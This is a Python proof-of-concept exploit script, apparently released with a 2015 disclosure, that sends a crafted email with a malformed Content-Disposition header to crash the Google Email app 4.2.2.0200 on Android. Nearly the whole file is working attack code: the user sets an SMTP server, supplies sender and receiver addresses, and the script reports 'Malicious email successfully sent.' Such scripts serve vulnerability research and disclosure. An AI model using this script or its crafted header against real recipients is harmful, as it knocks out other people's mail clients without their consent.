#!/usr/bin/python

'''
 * $FILE: crash_Android_Google_email_4.2.2.0200.py
 *
 * $VERSION$
 *
 * Authors: Hector Marco <hecmargi@upv.es>
 *          Ismael Ripoll <iripoll@disca.upv.es>
 *
 * Date:    Released 07 Jan 2015
 * 
 * Attack details: http://hmarco.org
 *
 * $LICENSE:  
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.
'''

import smtplib
from smtplib import SMTPException
import sys
import getopt

#### START CONFIGURE #####
smtpServer = "" # set an appropriate SMTP server
smtpServerPort = 25 # SMTP port, default 25
#### END CONFIGURE #####

sender = ''
receivers = []

def usage():
   print '\n$ %s -s sender@email.com -r receiver@email.com\n' % sys.argv[0]
   sys.exit(2)

def smtpNotConfigured():
   print '\n[-] Error: Edit this script and set a SMTP server to send emails\n'
   sys.exit(2)

def printHeader():
   print "\nEmail Android Google 4.2.2.0200 crasher"
   print "======================================="
   print "Author:  Hector Marco <hmarco@hmarco.org>"
   print "Website: http://hmarco.org"

def main(argv):
   global sender
   global receivers
   try:
      opts, args = getopt.getopt(argv,"hs:r:",["s=","r="])
      if len(sys.argv) == 1:
         usage()
   except getopt.GetoptError:
      usage()
   for opt, arg in opts:
      if opt == '-h':
         usage()
      elif opt in ("-s", "--sender"):
         sender = arg
      elif opt in ("-r", "--receiver"):
         receivers.append(arg)


if __name__ == "__main__":

   printHeader()

   if len(smtpServer) == 0:
      smtpNotConfigured()
      
   main(sys.argv[1:])
      
   message = "From: Sender <%s>\n" % sender 
   message += "To: Receiver <%s>\n" % receivers[0]
   message += """Subject: Crash test
Content-Type: text/plain
Content-Transfer-Encoding: 8BIT
Content-Disposition: ; 

"""

   print "\n[+] Sending crafted message to: %s" % receivers[0]

   try:
      smtpObj = smtplib.SMTP(smtpServer, int(smtpServerPort));
      smtpObj.sendmail(sender, receivers, message)         
      print "[+] Malicious email successfully sent."
   except SMTPException:
      print "[-] Error: unable to send the email. Invalid SMTP server ???"
      sys.exit(2)
   
